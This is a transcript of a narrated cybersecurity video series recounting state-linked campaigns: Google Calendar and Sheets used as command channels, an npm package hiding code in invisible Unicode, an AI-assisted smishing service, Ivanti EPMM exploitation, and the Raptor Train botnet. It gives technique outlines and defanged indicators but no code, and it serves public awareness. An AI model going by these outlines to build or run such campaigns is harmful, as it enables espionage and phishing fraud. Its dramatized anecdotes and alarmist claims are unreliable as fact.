**1:34:33** · It starts with an LNK file. A Windows shortcut that looks harmless enough. Double-click it and you launch something called PlusDrop. PlusDrop's job is simple. It decrypts and executes another component called PlusInject. All in memory. No files written to disk. Nothing for antivirus to scan. Then PlusInject does something clever.

**1:34:56** · It performs what's called process hollowing. Here's how that works. Your Windows computer runs a legitimate system process called svchost\[.\]exe. It's always running. It's supposed to be there.

**1:35:08** · Security tools trust it completely. PlusInject hijacks that trusted process. It injects ToughProgress malware directly into svchost\[.\]exe's memory space.

**1:35:21** · To any monitoring system, everything looks normal. But what’s important to remember is ToughProgress needs to communicate with its operators. It needs to receive commands and send back stolen data. Most malware connects to suspicious domains. Shady servers in foreign countries. IP addresses that security teams can block.

**1:35:42** · ToughProgress does something different. It talks to Google Calendar.

**1:35:46** · The same calendar that manages your work meetings, your doctor's appointments, your kids' soccer games. That's now hosting encrypted malware commands.

**1:35:54** · ToughProgress creates calendar events with zero-minute durations. Events that last exactly zero minutes. They appear and disappear so quickly that most users would never notice them.

**1:36:06** · These events get created on hardcoded dates. May 30th, 2023 for storing encrypted data. July 30th and July 31st, 2023 for retrieving commands. The encryption is sophisticated. A hardcoded 10-byte XOR key scrambles the initial data. Then each individual message gets its own 4-byte XOR key for additional protection. Everything gets compressed using LZNT1 compression to reduce the size. LZNT1 compression squeezes the communications down so they transfer faster and stay hidden. From a network security perspective, this traffic is borderline invisible.

**1:36:40** · Your organization probably uses Google Workspace. Your employees access Google Calendar all day every day.

**1:36:50** · Your security team likely SSL bypassed the traffic, so it’s encrypted. It's allowed. It flows through to Google's servers with no problem. Nothing suspicious. Nothing to investigate.

**1:37:02** · We found a parallel campaign. Code-named Voldemort.

**1:37:06** · August 5th, 2024. That's when Voldemort launched. But Voldemort wasn't using Google Calendar. It was using Google Sheets. See what happened was the legitimate software Cisco WebEx includes an executable called CiscoCollabHost\[.\]exe.

**1:37:20** · That's a trusted file. But the attackers replaced the supporting library file, CiscoSparkLauncher\[.\]dll, with their bad version. Once Voldemort infected a machine, it did something remarkable with Google Sheets. The malware contained embedded client IDs, secrets, and refresh tokens stored in encrypted configuration files. These are legitimate Google API credentials. The kind that real applications use to access Google services.

**1:37:49** · Voldemort authenticates to Google Sheets using these credentials. To Google's servers, this looks like a legitimate business application accessing spreadsheet data.

**1:37:58** · Each infected machine gets assigned a unique identifier, a UUID. When the malware needs to communicate, it writes data to specific cells in Google Sheets using that UUID.

**1:38:09** · Machine A writes to one set of cells. Machine B writes to completely different cells.

**1:38:14** · The command capabilities are comprehensive. Through Google Sheets, the attackers can execute ping, dir, download, upload, exec, copy, move, sleep, and exit commands.

**1:38:26** · Full remote control of infected systems through spreadsheet cells.

**1:38:29** · U.S targets received fake IRS communications. UK targets got fake HMRC messages. Each email perfectly crafted to match local tax authorities. Proofpoint's assessment was clear: the most likely objective is cyber espionage. Two separate campaigns. This is China’s weaponization of Google's entire service ecosystem.

**1:38:50** · Calendar events for ToughProgress. Spreadsheet cells for Voldemort.

**1:38:54** · Why build your own command-and-control infrastructure when you can just rent Google's?

**1:39:02** · Then something happened that changed everything. Just a few months ago in march, an innocent-looking package appeared on NPM called 'os-info-checker-es6'.

**1:39:12** · NPM is Node Package Manager. It's where developers download code to build stuff.

**1:39:17** · For weeks, the package was completely benign. Just a simple utility for checking operating system information. Nothing malicious. Nothing suspicious.

**1:39:27** · But on May 7th, 2025, something changed. The package turned malicious. Overnight.

**1:39:33** · By that time, it had been downloaded over 1,000 times. It was listed as a dependency for four other packages: skip-tot, vue-dev-serverr, vue-dummyy, and vue-bit.

**1:39:40** · Here's the scary part. This wasn't APT41. This was a completely different threat actor who had copied their Google Calendar technique.

**1:39:48** · The concealment method was sophisticated. The attackers used Unicode steganography.

**1:39:53** · They hid malicious code within invisible characters from something called the Variation Selectors Supplement range. Character codes U+E0100 to U+E01EF.

**1:40:02** · These characters appear as empty space to anyone looking at the code. But they contain executable instructions. When the package ran, it used a function called 'ymmogvj' to decode base64-encoded URLs. Then it fetched Google Calendar short links for command retrieval. The same zero-minute calendar event technique that APT41 pioneered. Now being used by random cybercriminals targeting devs.

**1:40:27** · The package remained on NPM despite being reported. Probably gone by the time you’re seeing this video though. APT41's Google Calendar C2 technique was spreading into the broader threat ecosystem. They’re going viral in the worst possible way.

**1:40:44** · Ok so imagine you're working at Google. Your Calendar service is hosting malware commands. Your Sheets platform is running remote access operations for Chinese state hackers.

**1:40:54** · Random criminals are copying the techniques and spreading them through developer packages.

**1:40:58** · Your infrastructure is being weaponized against your own users.

**1:41:03** · What do you do? Google's Threat Intelligence Group launched a coordinated counterstrike. This wasn't just blocking a few bad domains. This was warfare on hackers. The hunt began in the Calendar system.

**1:41:14** · Analysts combed through millions of events looking for specific patterns. Zero-minute durations. Events created on those hardcoded dates. Suspicious authentication patterns from accounts that shouldn't exist. They found them.

**1:41:27** · GTIG identified and terminated the specific attacker-controlled Google Calendar instances.

**1:41:31** · They disabled the compromised Workspace accounts. Cut off the communication channels that APT41 had spent months building. Then the team moved to Google Sheets.

**1:41:42** · They analyzed cell access patterns, looking for the UUID-based isolation that Voldemort used. Machines writing to specific cells. Automated API calls that looked legitimate but followed suspicious patterns. That led to more accounts terminated.

**1:41:55** · Then came updating Google's Safe Browsing system. Every domain and URL associated with the campaigns got blacklisted. Users trying to access malicious sites would get warning pages instead.

**1:42:10** · ToughProgress wasn't just innovative. Instead of hardcoding function addresses that antivirus engines could easily spot, ToughProgress does something different.

**1:42:18** · It performs mathematical operations to calculate addresses dynamically at runtime.

**1:42:23** · But that's just the beginning. The malware uses a 64-bit register overflow technique to dynamically calculate function addresses.

**1:42:31** · It performs arithmetic operations that cause the processor's 64-bit registers to overflow, landing precisely on the target function address. It's like giving someone directions by saying "drive until your odometer rolls over, then turn left."

**1:42:46** · The destination is the same, but the path is impossible to predict.

**1:42:50** · Then there's the function dispatch table method. ToughProgress routes program execution through lookup tables instead of direct function calls. Think of it like a phone directory where every number changes based on what time you call. This makes code flow analysis extremely difficult.

**1:43:07** · When I look at the logs and try to understand what the malware does, I can't simply follow the execution path. Every function call goes through a table lookup that changes the destination. On that note, just remember ToughProgress constantly monitors whether it's running under analysis tools.

**1:43:22** · If it detects debugging software, it alters its behavior or simply stops running. Similar to how it’s checking for virtual machine environments. Analyzing processor timing to detect sandboxes.

**1:43:33** · Looking for specific registry keys that indicate security research tools. So yeah just be mindful.

**1:43:39** · All of this happens while the LZNT1 compression continues protecting the Google Calendar communications. Even if we capture the network traffic, it’s compressed and encrypted.

**1:43:50** · As a researcher honestly this malware is pushing the boundaries of what's technically possible.

**1:43:56** · This is what cyber security defenders are up against. You still want that job in cyber security?

**1:44:03** · Network-based detection becomes nearly impossible when malicious traffic blends perfectly with legitimate Google Workspace activity. Security teams can't block Google Calendar access. They can't flag Google Sheets API calls as suspicious.

**1:44:18** · Every company puts so much trust into cloud providers, well this video is letting you know that trust becomes a weapon in the hands of sophisticated attackers.

**1:44:28** · Be careful and don’t let your calendar become a weapon, or your spreadsheet a command center. Because APT41 doesn't limit themselves to government targets either.

**1:44:37** · Google's investigation revealed attacks against global shipping companies, logistics firms, media organizations, entertainment companies, technology sectors, and automotive manufacturers.

**1:44:48** · Industries that power your daily life. The systems that move your packages, stream your content, build your cars.

**1:44:53** · The numbers are staggering. Over 70 organizations targeted across insurance, aerospace, transportation, and education sectors. Over 20,000 phishing emails sent.

**1:45:03** · On the peak day, they blasted out 6,000 emails in 24 hours.

**1:45:08** · Will you be next?

### This AI Phishing-as- a-Service platform runs 24/7.

**1:45:22** · A secret army of hackers, thousands strong, striking your phone. They're not after fame, they're building a machine so slick, so precise. In mid-2023, a Chinese cyber collective emerged.

**1:45:36** · They call themselves XinXin, though in certain circles they're known by another name: Black Technology. These aren't your typical basement hackers writing angry manifestos. No, XinXin operates like a corporation—a very illegal one. Their flagship product? A smishing platform called Lucid. Now, I need to pause here. You know those security features Apple and Google keep bragging about? The ones that lock your messages with end-to-end encryption? XinXin looked at those features and saw opportunity.

**1:46:10** · See, when your messages are encrypted end-to-end, nobody can read them except you and the person you're texting. Not your carrier, not the government, and crucially—not the spam filters.

**1:46:24** · That's the genius of it. XinXin weaponized privacy.

**1:46:28** · They built Lucid to pump messages through iMessage and RCS—that's Rich Communication Services, the new standard that's replacing old SMS texts. While everyone else was still sending basic spam through SMS, getting caught by filters left and right, XinXin went stealth. Their messages slide right through because they're encrypted.

**1:46:50** · The filters can't see what's inside. The scale? One hundred sixty-nine entities hit across eighty-eight countries. We're talking postal services, shipping companies, toll systems—the services you interact with every day. USPS, DHL, the brands you trust. XinXin doesn't just impersonate them; they've turned impersonation into an art form.

**1:47:19** · And here's what really gets me: they're selling this. Right now, on Telegram, there are subscription packages. Monthly plans. Customer service. Tech support.

**1:47:30** · They've built a criminal enterprise with the infrastructure of a Silicon Valley startup.

**1:47:41** · One hundred thousand messages. Every single day. That's what Lucid was pumping out by late 2023.

**1:47:49** · One hundred thousand perfectly crafted smishing attacks flooding into phones across the globe.

**1:47:54** · Your phone, your mom's phone, your coworker's phone. Every notification could be them.

**1:48:01** · RCS—Rich Communication Services—was supposed to be the future of texting. Better than SMS, more secure, with sender verification built right in. But XinXin found the cracks. See, RCS has this sender validation system that's meant to verify who's actually sending you messages. It's like a bouncer checking IDs at a club. But XinXin discovered the bouncer wasn't checking very carefully. They could spoof legitimate services. Make their messages look like they came from USPS tracking your package.

**1:48:32** · From your toll road operator warning about an unpaid fee. From DHL with an urgent delivery notice. The encryption that protects these messages from prying eyes? It also protects them from security filters.

**1:48:53** · You're thinking SMS scams are old news? XinXin's laughing—they've turned your phone's security into their loophole. But messages need to come from somewhere. And that's where things get industrial. Picture rows and rows of smartphones.

**1:49:09** · Hundreds of them. iPhones, Androids, all mounted on metal racks in climate-controlled rooms. The air hums with electronic heat. Each device has its own temporary Apple ID, its own identity. They're not stealing accounts—they're creating thousands of disposable ones.

**1:49:29** · This is a device farm. And it runs twenty-four seven.

**1:49:34** · LARVA-242—real name changqixinyun—built this system. While you're sleeping, their code is orchestrating this digital symphony. Each phone sends its quota of messages, then rotates to a new identity. New Apple ID, new device fingerprint, new attack vector. It's cybercrime on an assembly line. And when something breaks? When Apple patches a vulnerability or a carrier blocks their numbers? That's when ladeng999888 steps in. Customer service for criminals.

**1:50:04** · They keep the machine running, updating configurations, swapping out burned devices, ensuring the messages never stop flowing.

**1:50:17** · This isn't some guy in a basement with a laptop. This is infrastructure.

**1:50:22** · But XinXin wasn't satisfied with just messages. They wanted more.

**1:50:27** · February 20, 2025. They announce Darcula version 3.

**1:50:32** · Darcula isn't just another phishing kit. It's PhaaS—Phishing as a Service. You know how legitimate companies offer Software as a Service? XinXin took that model and weaponized it.

**1:50:43** · At its core is Puppeteer. Now, Puppeteer started life as a legitimate tool. Developers use it to automate web browsers for testing. You write code, Puppeteer controls Chrome, clicking buttons, filling forms, taking screenshots. It's incredibly powerful for legitimate purposes.

**1:51:05** · XinXin uses it to clone websites. Puppeteer doesn't just copy the look—it replicates the entire user experience. Every button, every form field, every animation. The HTML and CSS are perfect because they're scraped directly from the source.

**1:51:23** · The admin dashboard reads like something from a Silicon Valley startup. Real-time analytics. Conversion rates. Geographic heat maps showing which regions are clicking through. When someone falls for a phish, the admin gets a Telegram notification instantly. They can watch their success rate climb in real time. LARVA-241—alias wangduoyu0—coded the first version of this system. Now it's evolved into something far more dangerous. Version 3 added multi-language support. Automated translation. Regional customization.

**1:51:56** · Your grandmother in Ohio gets a different pitch than a businessman in Berlin, but both messages are perfectly built.

**1:52:15** · April 28, 2025. Remember that date. That's the day XinXin changed the game forever. That's the day Darcula got an upgrade that would make security professionals wake up in cold sweats. They integrated generative AI.

**1:52:31** · LARVA-246—going by this unique handle X667788X0—pushed the update.

**1:52:36** · Before this moment, creating a convincing phishing page took skill. You needed to know HTML. CSS.

**1:52:44** · JavaScript. You had to understand web design, color theory, user experience. Even with tools like Puppeteer doing the heavy lifting, you still needed technical knowledge to customize, to adapt, to make it work. Not anymore.

**1:53:01** · Now you log into Darcula, type what you want in plain language, and the AI does the rest.

**1:53:08** · "Create a Bank of America login page in Spanish." Done. "Make a FedEx delivery notice for German customers." Created in seconds. "Design a tax refund form that looks like it's from the IRS."

**1:53:23** · The AI generates it perfectly, complete with all the right logos, fonts, and official-looking fine print. The AI doesn't just translate—it localizes.

**1:53:36** · It knows that British banks use different terminology than American ones. It understands that Japanese customers expect different design elements than Brazilian ones. Every generated page is culturally tuned, linguistically perfect, visually identical to the real thing.

**1:53:54** · Think about what that means. Every small-time crook with a Telegram account and a few hundred dollars can now run sophisticated phishing campaigns. The grandmother who falls for email scams? She could run her own operation now. The subscription model made it even worse. Pay monthly via Telegram, get unlimited AI-generated phishing pages. Customer support included.

**1:54:21** · Updates guaranteed. It's Netflix for criminals. AI writing phishing pages? XinXin just handed the keys to the kingdom to anyone with a subscription. This is the moment their operation went from elite to unstoppable. Because how do you defend against thousands of unique, AI-generated attacks? How do you train employees to spot fakes when the fakes are perfect? When they're created faster than any human can analyze them?

**1:54:53** · The underground forums erupted. Some called it genius. Others called it the beginning of the end.

**1:55:00** · XinXin had built a monster. And now, they were selling it to anyone who could pay.

**1:55:12** · Just when security teams thought they had XinXin figured out, XinXin had gone mobile.

**1:55:17** · That’s right, they were spotted running campaigns from moving cars now.

**1:55:21** · Every cell tower they pass gives them a new IP address. Every mile driven makes them harder to trace. IP filtering became their shield. When security researchers try to investigate suspicious traffic, they hit a wall. XinXin's systems detect the probe and block that IP instantly. The researchers see nothing. Meanwhile, regular users—potential victims—see everything. But it's the randomized paths that really show their paranoia. Every attack takes a different route through the internet.

**1:55:53** · One message might bounce through servers in Romania, Singapore, and Brazil before hitting your phone. The next one?

**1:56:07** · Canada, Morocco, South Africa. No patterns. No predictability. Just chaos by design.

**1:56:16** · Niuniu888niu orchestrates this madness in real time.

**1:56:20** · This admin watches the operations dashboard from who knows where, adjusting tactics on the fly.

**1:56:28** · Too many blocks from one region? Switch the routing.

**1:56:32** · Detection rates climbing? Change the message templates.

**1:56:36** · You think you'd catch them? They're literally driving circles around us.

**1:56:40** · These attackers don’t have fixed locations. Data centers. Offices. Homes. Something you can trace, investigate, maybe even raid. But how do you catch someone who's doing 70 miles per hour down Interstate 95 while running a phishing campaign? Next time they strike, will it be from a car, a plane, or somewhere we can't even imagine? The only thing we know for certain is that XinXin isn't done. They've gone from encrypted messages to AI-powered campaigns to mobile operations in less than two years. Each evolution makes them harder to catch, harder to stop.

**1:57:17** · The future of cybercrime isn't in dark basements or foreign data centers.

**1:57:22** · It's on the open road, always moving, always adapting, always one step ahead.

**1:57:35** · Developers like wangduoyu0 who wrote the foundation, Admins like Niuniu888niu orchestrating campaigns while the world sleeps. Customer service reps like ladeng999888, helping subscribers maximize their criminal potential.

**1:57:53** · But who are they really? Who's really behind those aliases?

**1:57:57** · The answer might be simpler than you think. They could be anyone. They could be everyone.

**1:58:03** · They could be the person sitting next to you on the train, typing away on their phone.

**1:58:07** · Welcome back to the Hacker Gallery. I'm The Operator, and today I'm going to tell you about a cyber attack that probably affected you personally, even if you never heard about it.

### You're potentially feeding data to Chinese intelligence servers.

**1:58:28** · In April 2025, something unprecedented happened in cyberspace. GreyNoise, a threat intelligence firm that monitors global internet activity, detected an 800% surge in scanning activity. But this wasn't random digital noise—this was reconnaissance.

**1:58:47** · Let me explain what that means. Scanning is when attackers systematically probe networks, looking for vulnerabilities they can exploit later. Think of it as digital reconnaissance—hackers mapping out their targets before the real attack begins. It's automated, it's methodical, and when you see an 800% increase, you know something big is coming.

**1:59:09** · The targets? Ivanti Connect Secure and Pulse Secure systems. Now, you might not recognize those names, but these are the enterprise software solutions that manage and secure the devices you use every day. Your work phone, the systems at your hospital, the networks that run airports—they all rely on this type of software.

**1:59:30** · GreyNoise's analysts weren't mincing words. They called this scanning activity "a precursor to exploitation, indicating heightened activity by potential attackers, likely preparing for vulnerability discovery and exploitation." Translation: someone was conducting surveillance for a major operation. But here's what makes this story particularly unsettling. While most companies were focused on their quarterly reports and business as usual, state-sponsored hackers were already inside the gates, methodically cataloging weaknesses in the very systems designed to protect critical infrastructure.

**2:00:05** · What happened next would affect your hospital visits, your flights, and devices you use every day. Because when those scans turned into actual attacks just weeks later, the consequences reached far beyond the digital realm into the physical world where real people live and work.

**2:00:22** · The 800% surge was just the beginning. The real attack was still coming.

**2:00:31** · May 14th, 2025. Ivanti's security team found two critical vulnerabilities in their Endpoint Manager Mobile software—EPMM for short. This is the software that manages and secures company-issued devices. Your work phone, hospital tablets, airport security systems—all controlled by software like this. The first vulnerability got the designation CVE-2025-4427. This was an authentication bypass flaw with a CVSS score of 5.3. Let me explain what that means.

**2:01:03** · Authentication is how systems verify you are who you say you are—like showing your ID at a bar. An authentication bypass vulnerability means attackers can skip this step entirely. They can access protected systems without providing any credentials, as if they walked past the bouncer without showing ID.

**2:01:19** · The second vulnerability, CVE-2025-4428, was even worse. This was a remote code execution flaw scoring 7.2 on the CVSS scale. Remote code execution means an attacker can send malicious commands to a system and make it do whatever they want. They can install malware, steal data, or completely take over the device—all from thousands of miles away.

**2:01:47** · But the real danger wasn't either vulnerability alone. It was what happened when you chained them together. Vulnerability chaining means combining multiple security flaws to achieve greater access than any single flaw would allow. First, you bypass authentication to get inside. Then, you execute code to take complete control. Australia's Signals Directorate—their equivalent of our NSA—immediately issued a critical warning. They specifically called out "large organizations and government entities," highlighting how these chained vulnerabilities could be exploited for "unauthenticated remote code execution when combined."

**2:02:27** · The vulnerabilities were traced back to two unspecified open-source libraries that Ivanti had integrated into EPMM. Open-source code isn't inherently dangerous, but when vulnerabilities exist in widely-used libraries, the impact spreads across every system that uses them.

**2:02:47** · Ivanti rushed out patches on May 14th. In the cybersecurity world, once vulnerabilities are publicly disclosed, the clock starts ticking. Organizations have a narrow window to patch their systems before attackers start exploiting them. But patches don't stop determined hackers.

**2:03:04** · May 15th—just one day after the patches were released—unknown attackers began exploiting both vulnerabilities. These weren't opportunistic criminals who stumbled across the vulnerabilities and decided to take advantage. This was a coordinated campaign by attackers who were already prepared, already positioned, and already knew exactly what they wanted to do. Sarah, a network administrator at a regional hospital, noticed something strange in her logs that Tuesday morning. Unusual authentication requests. Failed login attempts that somehow weren't failing. Server room lights blinking frantically as malicious code spread through networks managing thousands of devices.

**2:03:27** · The UK's National Health Service—NHS hospitals that handle millions of patient records and manage life-critical systems. Germany's largest telecommunications provider, controlling communications infrastructure for an entire nation. A US transport infrastructure entity managing Houston's airport systems, where thousands of travelers pass through daily. A Japanese automotive parts supplier, likely managing supply chain data for major manufacturers. An Irish aerospace leasing company. North American healthcare companies. Even a multinational bank in South Korea.

**2:03:59** · This wasn't random. This was strategic. Each target represented a different piece of critical infrastructure. The attackers had clearly done their homework. They knew exactly which organizations used vulnerable versions of EPMM.

**2:04:13** · They knew which systems would give them the most valuable access. And they moved with the precision of a military operation, hitting targets across multiple time zones in a coordinated campaign.

**2:04:29** · For weeks, cybersecurity researchers around the world had been analyzing the attack, trying to piece together who was behind this unprecedented assault on critical infrastructure.

**2:04:40** · The breakthrough came from EclecticIQ, a Dutch cyberthreat intelligence firm that specializes in tracking advanced persistent threats. The attackers had a name: UNC5221.

**2:04:55** · UNC5221 is what security researchers call a China-nexus espionage group. They've been linked to zero-day exploitation of edge network appliances since at least 2023. Zero-day exploits are attacks that use vulnerabilities unknown to software vendors—the most sophisticated weapons in a hacker's arsenal. Attribution was based on TTPs—tactics, techniques, and procedures. Think of TTPs as a hacker's fingerprint. Every advanced group develops distinctive methods of operating, and UNC5221's signature was all over this attack.

**2:05:35** · The technical sophistication was staggering. The attackers deployed advanced malware including something called KrustyLoader—a backdoor that creates persistent hidden access to compromised systems. But KrustyLoader wasn't hosted on some shady server in a basement.

**2:05:50** · It was sourced from a compromised Amazon Web Services S3 bucket. AWS is one of the most trusted cloud platforms in the world, and UNC5221 had hijacked it to host their malware.

**2:06:01** · Once KrustyLoader established initial persistence, the attackers deployed a second tool called Sliver. Sliver is a remote-control suite that gives hackers advanced capabilities to control compromised systems from anywhere in the world. They can steal data, install additional malware, or use the compromised system as a launching pad for further attacks.

**2:06:22** · Now, let me tell you what they were really after, because this is where the story gets truly unsettling. The primary target wasn't financial data or intellectual property. It was something called the “mifs database”.

**2:06:35** · This database is a treasure trove for espionage operations: "It gives threat actors visibility into managed mobile devices, including IMEI numbers, phone numbers, location data, SIM details, LDAP users, and Office 365 refresh and access tokens."

**2:06:56** · IMEI numbers are unique identifiers for mobile devices—essentially serial numbers that can track specific phones. Phone numbers and location data are self-explanatory. SIM details reveal which cellular networks devices connect to. LDAP users are directory listings showing who has access to what systems. And Office 365 tokens? Those are keys that can grant access to email, documents, and cloud applications. With access to the mifs database, UNC5221 could potentially monitor and track thousands of devices used by critical infrastructure organizations worldwide.

**2:07:33** · The evidence pointing to Chinese state sponsorship was overwhelming. Investigators traced attack traffic back to IP address 27\[.\]25\[.\]148\[.\]183, hosted in China. But this wasn't just any Chinese IP address—it was the same one UNC5221 had used in previous SAP NetWeaver attacks just weeks earlier in May.

**2:07:54** · UNC5221 had just pulled off one of the most sophisticated espionage operations in cybersecurity history, and barely no one even knew it yet. But at least you know now.

**2:08:12** · Six months after UNC5221's devastating attack on critical infrastructure worldwide, the cybersecurity community faced an uncomfortable truth. How many systems remain compromised?

**2:08:24** · Ivanti's official statement was telling in its uncertainty: "The investigation is ongoing and Ivanti does not have reliable atomic indicators at this time.

**2:08:34** · Customers should reach out to our Support Team for guidance."

**2:08:37** · Atomic indicators are the fingerprints that cybersecurity teams use to identify whether their systems have been breached. They're specific technical signatures—file names, network connections, code patterns—that reveal an attacker's presence. Without reliable atomic indicators, organizations were flying blind. They had no way to scan their networks and definitively say whether UNC5221 was still lurking in their systems.

**2:09:03** · IT administrators couldn't tell if Chinese hackers still had access to networks.

**2:09:09** · UNC5221 had targeted multiple versions of Ivanti's Endpoint Manager Mobile software: versions 11.12.0.4 and earlier, 12.3.0.1 and earlier, 12.4.0.1 and earlier, and 12.5.0.0 and earlier.

**2:09:29** · Organizations running any of these versions were to consider themself compromised, but they had no way to know for certain. Cloud deployments were supposed to be more secure, easier to monitor, and simpler to patch. But UNC5221 had proven that location didn't matter.

**2:09:48** · Whether your EPMM system ran in your basement server room or on Amazon's cloud infrastructure, Chinese state hackers could still break in and establish surveillance capabilities.

**2:09:57** · The troubling pattern that emerged made the situation even more unsettling. This marked the fourth time in three years that UNC5221 had successfully exploited Ivanti vulnerabilities.

**2:10:10** · They had developed deep knowledge of Ivanti's products, understanding the software architecture well enough to consistently find and exploit weaknesses.

**2:10:24** · Every time you connect your work phone to WiFi, you're potentially feeding data to Chinese intelligence servers. When you check into a hospital and they scan your information with a tablet, that device could be reporting your location and medical status to foreign state actors. When you travel through an airport where UNC5221 has compromised the device management systems, your movements might be tracked by adversaries who see you as a potential intelligence asset. The enemy remains active.

**2:10:55** · UNC5221 continues to operate with sophisticated tools and deep knowledge of enterprise systems, making every managed corporate computer a potential intelligence gathering point.

**2:11:07** · Think about the devices around you right now. Your work laptop. The hospital systems your doctor uses. The mobile devices that manage your bank accounts, your travel reservations, your communication with colleagues.

**2:11:22** · How many of these systems are running software that UNC5221 has compromised?

**2:11:27** · The most unsettling part? You'll probably never know.

**2:11:29** · The attack is invisible, the surveillance is silent, and the enemy has already won by the time you realize you're a target. Stay safe with ProtonVPN. Link in Bio.

### Chinese botnets works like this.

**2:11:43** · Your router, your security camera, your smart devices—silently enslaved by hackers halfway across the globe, targeting the heart of U.S. military defenses. This isn't fiction.

**2:11:53** · It's what happened with Raptor Train. In mid-2023, Black Lotus Labs uncovered something massive while investigating compromised routers. A botnet—a network of hacked devices controlled remotely—that had been operating since May 2020. Over 260,000 devices. Routers. IP cameras. Smart home tech. All compromised. All controlled by someone else.

**2:12:19** · A botnet works like this: hackers find vulnerabilities in everyday devices, infect them with malware, and turn them into an army of zombie machines. These compromised systems then execute commands without their owners knowing—stealing data, launching attacks, or flooding websites with traffic until they crash.

**2:12:36** · Raptor Train specifically targeted U.S. and Taiwanese infrastructure.

**2:12:40** · Not random targets. Strategic ones. The kind that matters to national security.

**2:12:45** · Why should you care? Because your devices could be next. The average home has dozens of internet-connected gadgets—each one a potential soldier in someone else's online army. And when 260,000 devices can be silently taken over for three years before anyone notices, we're looking at a serious problem. Something bigger is happening here—a shadowy force orchestrating it all. But who's really pulling the strings? And what are they after?

**2:13:11** · The answer would reveal something far more complex than anyone imagined.

**2:13:18** · For three years, Raptor Train grew in the shadows, morphing through secret campaigns.

**2:13:23** · It started in May 2020 with a campaign called Crossbill. The attackers set up a domain - k3121\[.\]com - and began deploying what security researchers call "Nosedive." This isn't your typical malware. Nosedive runs only in memory, leaving no traces on the hard drive. When a device reboots, the evidence vanishes. It's like a perfect crime - no fingerprints, no witnesses.

**2:13:50** · The Black Lotus Labs team tracked this thing from the beginning. They saw it evolve. By 2022, Raptor Train had transformed into its second phase: Finch. Using a new domain, b2047\[.\]com, they infected 10,000 devices. Not massive yet, but growing.

**2:14:07** · These weren't random machines. The botnet operated with a military-like structure. At the bottom, Tier 1: thousands of compromised devices - your routers, your cameras. Above them, Tier 2: command servers sending instructions. At the top, Tier 3: management nodes controlling everything.

**2:14:25** · It’s an online army with generals, commanders, and infantry.

**2:14:29** · In 2023, phase three hit: Canary. This campaign specifically targeted ActionTec PK5000 routers and Hikvision cameras. The perfect targets - devices people set up once and forget about. By mid-2023, they controlled 60,000 devices. Think about that. Sixty thousand machines, silently following orders from halfway around the world. The latest phase, Oriole, began later in 2023 using w8510\[.\]com. Even with researchers aware of their existence, they maintained control of 30,000 devices. That's how good they were at hiding.

**2:15:02** · By December 2023, Raptor Train was scanning U.S. military and government systems. Your security at stake.

**2:15:11** · It was probing U.S. defense bases and even a Kazakh government agency. This wasn't about stealing credit cards anymore. This was espionage. The attackers exploited vulnerabilities in Atlassian Confluence and Ivanti Connect Secure systems through CVE-2024-21887.

**2:15:27** · This scanning process is like reconnaissance. The botnet probes systems, looking for these specific vulnerabilities, gathering intelligence about what's vulnerable before striking.

**2:15:36** · By now, it had grown to 60,000 systems strong. The attackers were smart. Really smart. Their domain w8510\[.\]com climbed into the top million domains on the internet. This matters because many security tools use something called "domain whitelisting." They automatically trust popular domains because checking everything would slow systems down too much.

**2:16:00** · Black Lotus Labs noted exactly this: "Domains in these popularity lists often circumvent security tools via domain whitelisting." The whole operation was managed by a controller called Sparrow. This system distributed commands across the botnet, coordinated attacks, and deployed exploits. It was sophisticated. Professional. The work of experts.

**2:16:22** · This three-tier structure formed a fortress. For years, it operated with impunity. For years, it grew stronger. Someone had to stop it.

**2:16:34** · In September 2024, the FBI strikes, tearing into Raptor Train's core.

**2:16:40** · After years of watching this predator grow, the FBI launched a coordinated attack against the entire botnet infrastructure. This wasn't just some announcement or warning - this was digital warfare. With court approval, federal agents seized control of the command and control servers that had been directing thousands of compromised devices.

**2:16:59** · The FBI didn't just shut down servers. They went further. They sent commands through the botnet's own communication channels to remove Nosedive malware from all identified devices.

**2:17:09** · Think about that - using the attackers' own system against them. It's an incredibly rare move that requires precision and a legal greenlight. Meanwhile, Black Lotus Labs implemented what's called "null-routing" - effectively creating a black hole on the internet that swallowed all the malicious traffic. When infected devices tried to communicate with their controllers, those signals went nowhere. It's like cutting every phone line into a building at once.

**2:17:34** · Then came the bombshell. FBI Director Christopher Wray held a press conference and dropped the truth everyone had been suspecting: "We pried them from China's grip."

**2:17:42** · China. Not random hackers. Not cybercriminals looking for a payday. The Chinese government.

**2:17:48** · The evidence was clear. The operation was linked to a known Chinese state-sponsored hacking group called Flax Typhoon. The command infrastructure connected to China Unicom IP addresses - a state-owned telecommunications company. Even the timing gave them away - the SSH connections used to control the botnet consistently happened during Chinese working hours.

**2:18:10** · Four years of infiltration. Hundreds of thousands of devices. Military and government targets. This wasn't just cybercrime - it was cyber espionage on an industrial scale.

**2:18:21** · The FBI's operation completely disbanded Raptor Train. The malware was neutralized. The command structure was dismantled. The army was freed. But even in victory, security experts remained cautious. The botnet was down, the infrastructure seized, the immediate threat neutralized. But the minds behind it? They were still out there. Was this the end of Raptor Train? Or just a temporary setback for a persistent adversary like China?

**2:18:50** · The botnet's wounded, but the hackers are still out there, plotting their next move.

**2:18:54** · The FBI's operation was a massive hit against Raptor Train, but data from August 2024 - just before the takedown - tells a sobering story. Right up until the FBI strike, 60,000 devices remained fully under the control of these Chinese hackers.

**2:19:09** · Even more shocking was what security researchers discovered in June 2024. A MySQL database - essentially the botnet's central record-keeping system - contained details of 1.2 million compromised devices. Not 60,000. Not 260,000. One point two million. Among those were 385,000 systems in the United States alone. Think about that. In your neighborhood, your town, maybe even your street - devices silently controlled by foreign hackers. That small business down the road with the security camera overlooking their parking lot? Compromised.

**2:19:43** · That college with all those smart building systems? Infected. That medical office with patient records? Under surveillance. MySQL databases like this one are what hackers use to manage their operations. Each record represents a real device - a router in someone's home, a camera in a business, a server in an office. The database contained everything they needed to track and control their army. While the FBI and Black Lotus Labs crushed the botnet's infrastructure, the hackers themselves - the Chinese state-sponsored group known as Flax Typhoon - remain completely at large.

**2:20:18** · Their identities unknown. Their next targets unidentified. So far, no direct counterattacks have been observed. No immediate revenge for the FBI's operation. But in the world of state-sponsored hacking, silence doesn't mean inaction. It often means they're building something new, something better hidden, something designed to avoid the mistakes that led to Raptor Train's discovery.

**2:20:46** · You're not helpless in this fight. Four simple steps can dramatically reduce your risk of becoming part of the next botnet: First, reboot your routers regularly. Remember that Nosedive malware? It lives in memory. A simple reboot wipes it clean—at least temporarily. Make it a habit.

